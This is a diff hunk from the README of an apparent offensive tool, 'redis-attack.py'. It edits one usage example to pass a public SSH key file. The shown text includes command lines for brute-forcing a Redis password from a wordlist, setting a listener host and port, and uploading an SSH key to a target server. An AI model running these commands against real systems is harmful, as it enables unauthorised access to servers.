@@ -49,7 +49,7 @@ usage: python redis-attack.py [-h] -r RHOST [-p RPORT] -L LHOST [-P LPORT] [-wf 
 Example:
     python redis-attack.py -r 192.168.1.234 -L 192.168.1.2 --brute
     python redis-attack.py -r 192.168.1.234 -L 192.168.1.2 -P 80 -b mypwd.txt -i
-    python redis-attack.py -r 192.168.1.234 -L 192.168.1.2 -lf3 id_rsa
+    python redis-attack.py -r 192.168.1.234 -L 192.168.1.2 -lf3 id_rsa.pub
 
 optional arguments:
   -h, --help            show this help message and exit
